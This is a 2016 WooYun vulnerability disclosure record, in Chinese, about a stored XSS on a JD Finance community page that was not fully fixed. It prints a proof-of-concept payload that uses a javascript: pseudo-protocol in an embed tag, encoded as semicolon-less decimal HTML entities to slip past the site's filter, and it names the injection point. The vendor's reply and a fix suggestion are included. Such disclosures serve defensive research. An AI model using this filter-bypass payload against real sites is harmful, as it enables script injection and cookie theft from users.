{"id": 75266, "wybug_id": "wooyun-2016-0168044", "wybug_title": "京东金融某处存储XSS未修复完全", "wybug_corp": "京东金融", "wybug_author": "Non-polar", "wybug_date": "2016-01-07 15:19", "wybug_open_date": "2016-02-20 15:48", "wybug_type": "XSS 跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向公众公开  简要描述： 社区进不去，混点rank，请大牛不喜勿喷... 详细说明：  原漏洞地址： WooYun: 京东金融某处存储XSS跨站可提取Cookies \n\n乌云上显示漏洞已经修复，且已经公开了，修复过滤了javascript，转义了：但是根本的问题没有解决，利用漏洞原作者Power讲到的利用伪协议javascript，服务器端规则过滤了\"&#***;\"这种形式的实体编码，但是当使用\"&#***\"没有分号也可行，原因是JS是一种弱类型的语言。代码经过Unicode编码之后，浏览器是可以照样解析的。下面是过程 插入点:http://club.jr.jd.com/topic/602886 利用代码：\n<embed src=\"javascript:document.write('<script>alert(/wooyun/)</scirpt>')\">\n经过编码之后，评论处插入如下代码：\n</p>【签到】+在家玩过的。<embed src=&#000106&#00097&#000118&#00097&#000115&#00099&#000114&#000105&#000112&#000116&#00058&#000100&#000111&#00099&#000117&#000109&#000101&#000110&#000116&#00046&#000119&#000114&#000105&#000116&#000101&#00040&#00039&#00060&#000115&#00099&#000114&#000105&#000112&#000116&#00062&#00097&#000108&#000101&#000114&#000116&#00040&#00047&#000119&#000111&#000111&#000121&#000117&#000110&#00047&#00041&#00060&#00047&#000115&#00099&#000114&#000105&#000112&#000116&#00062&#00039&#00041>\n效果：\n\n当然由于用到的是embed标签，测试只有火狐可以触发（其实是其他的浏览器没有装，请自行测试）   漏洞证明：  见详细说明   修复方案：  拙见：对&和<>等特殊符号进行转义或过滤，本例来说，要转义&   版权声明：转载请注明来源 Non-polar@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-01-08 10:54 厂商回复： 感谢关注京东金融安全！评分原因：存储XSS危害较高，但由于内部平台近期已有人提交类似漏洞，属已知问题，整改中，感谢白帽子！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-09 19:38 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:24        )\t\t \n  哎 不是修复了嘛？ 哈哈 啪啪的    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}